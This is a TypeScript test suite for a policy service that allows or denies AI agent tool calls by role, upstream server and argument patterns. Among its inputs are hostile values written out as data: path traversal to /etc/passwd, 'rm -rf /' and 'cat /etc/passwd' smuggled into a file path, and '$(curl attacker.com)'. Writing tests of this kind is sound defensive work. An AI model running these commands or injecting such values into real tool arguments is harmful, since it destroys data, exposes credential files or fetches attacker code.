import { describe, it, expect, beforeEach } from 'vitest';
import { PolicyService } from '../../src/services/policy';
import { PolicyInput } from '../../src/types';
import { AppConfig } from '../../src/config';

// Use built-in fallback policy (OPA_ENABLED=false)
const testConfig: AppConfig = {
  port: 3000,
  jwtSecret: 'test-secret',
  opaUrl: 'http://localhost:8181',
  opaEnabled: false,
  dbPath: ':memory:',
  storeFullArgs: false,
  upstreams: [],
  rateLimitCapacity: 10,
  rateLimitRefillPerSecond: 2,
  logLevel: 'silent',
};

function makeInput(overrides: Partial<PolicyInput> = {}): PolicyInput {
  return {
    actor: 'alice',
    orgId: 'org-1',
    roles: ['editor'],
    upstreamId: 'fs-server',
    tool: 'readFile',
    args: { path: 'hello.txt' },
    time: new Date().toISOString(),
    ip: '127.0.0.1',
    sessionId: 'session-test',
    ...overrides,
  };
}

describe('PolicyService (built-in fallback)', () => {
  let policy: PolicyService;

  beforeEach(() => {
    policy = new PolicyService(testConfig);
  });

  // ── ALLOW scenarios ──────────────────────────────────────────────────────

  describe('allow scenarios', () => {
    it('allows readFile for editor role', async () => {
      const decision = await policy.evaluate(makeInput({
        tool: 'readFile',
        args: { path: 'hello.txt' },
        roles: ['editor'],
      }));

      expect(decision.allow).toBe(true);
      expect(decision.reason).toBe('allowed');
    });

    it('allows listDir for viewer role', async () => {
      const decision = await policy.evaluate(makeInput({
        tool: 'listDir',
        args: { path: '.' },
        roles: ['viewer'],
      }));

      expect(decision.allow).toBe(true);
    });

    it('allows writeFile for admin role', async () => {
      const decision = await policy.evaluate(makeInput({
        tool: 'writeFile',
        args: { path: 'output.txt', content: 'hello' },
        roles: ['admin'],
      }));

      expect(decision.allow).toBe(true);
    });

    it('allows writeFile for editor role', async () => {
      const decision = await policy.evaluate(makeInput({
        tool: 'writeFile',
        args: { path: 'output.txt', content: 'hello' },
        roles: ['editor'],
      }));

      expect(decision.allow).toBe(true);
    });

    it('allows fetchUrl for http-server', async () => {
      const decision = await policy.evaluate(makeInput({
        upstreamId: 'http-server',
        tool: 'fetchUrl',
        args: { url: 'https://example.com' },
        roles: ['viewer'],
      }));

      expect(decision.allow).toBe(true);
    });
  });

  // ── DENY scenarios ───────────────────────────────────────────────────────

  describe('deny: tool not in allowlist', () => {
    it('denies unknown tool on fs-server', async () => {
      const decision = await policy.evaluate(makeInput({ tool: 'execCommand' }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/allowlist/i);
    });

    it('denies writeFile on http-server (wrong upstream)', async () => {
      const decision = await policy.evaluate(makeInput({
        upstreamId: 'http-server',
        tool: 'writeFile',
        args: { path: 'file.txt', content: 'data' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/allowlist/i);
    });

    it('denies calls to unknown upstream', async () => {
      const decision = await policy.evaluate(makeInput({ upstreamId: 'unknown-server' }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/allowlist/i);
    });
  });

  describe('deny: role restriction (viewer cannot write)', () => {
    it('denies writeFile for viewer role', async () => {
      const decision = await policy.evaluate(makeInput({
        tool: 'writeFile',
        args: { path: 'out.txt', content: 'data' },
        roles: ['viewer'],
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/role restriction/i);
    });

    it('denies postUrl for viewer role', async () => {
      const decision = await policy.evaluate(makeInput({
        upstreamId: 'http-server',
        tool: 'postUrl',
        args: { url: 'https://example.com', body: '{}' },
        roles: ['viewer'],
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/role restriction/i);
    });
  });

  describe('deny: dangerous argument patterns', () => {
    it('denies path traversal (../)', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { path: '../../../etc/passwd' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/dangerous/i);
    });

    it('denies Windows-style traversal (..\\)', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { path: '..\\..\\windows\\system32' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/dangerous/i);
    });

    it('denies shell command separator (;)', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { path: 'file.txt; rm -rf /' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/dangerous/i);
    });

    it('denies shell AND operator (&&)', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { path: 'file.txt && cat /etc/passwd' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/dangerous/i);
    });

    it('denies command substitution ($(...))', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { content: '$(curl attacker.com)' },
      }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/dangerous/i);
    });

    it('allows clean path with no dangerous patterns', async () => {
      const decision = await policy.evaluate(makeInput({
        args: { path: 'data/report-2024.txt' },
      }));

      expect(decision.allow).toBe(true);
    });
  });

  describe('redactions', () => {
    it('non-admin actors get sensitive field redactions', async () => {
      const decision = await policy.evaluate(makeInput({ roles: ['editor'] }));

      expect(decision.allow).toBe(true);
      expect(decision.redactions).toBeDefined();
      expect(decision.redactions!['password']).toBe(true);
      expect(decision.redactions!['token']).toBe(true);
    });

    it('admin actors get no redactions', async () => {
      const decision = await policy.evaluate(makeInput({ roles: ['admin'] }));

      expect(decision.allow).toBe(true);
      expect(decision.redactions).toEqual({});
    });
  });

  describe('hook sources (ext:*) bypass upstream checks', () => {
    it('allows any tool from hook source', async () => {
      const decision = await policy.evaluate(makeInput({
        upstreamId: 'ext:claude-code',
        tool: 'Bash',
        args: { command: 'ls -la && echo done' },
        roles: ['developer'],
      }));

      expect(decision.allow).toBe(true);
    });

    it('allows hook source with patterns that would block MCP upstreams', async () => {
      const decision = await policy.evaluate(makeInput({
        upstreamId: 'ext:cursor',
        tool: 'shell',
        args: { command: 'cd ../parent; npm test' },
        roles: ['viewer'],
      }));

      expect(decision.allow).toBe(true);
    });
  });

  describe('missing tool', () => {
    it('denies when tool is empty string', async () => {
      const decision = await policy.evaluate(makeInput({ tool: '' }));

      expect(decision.allow).toBe(false);
      expect(decision.reason).toMatch(/tool/i);
    });
  });
});
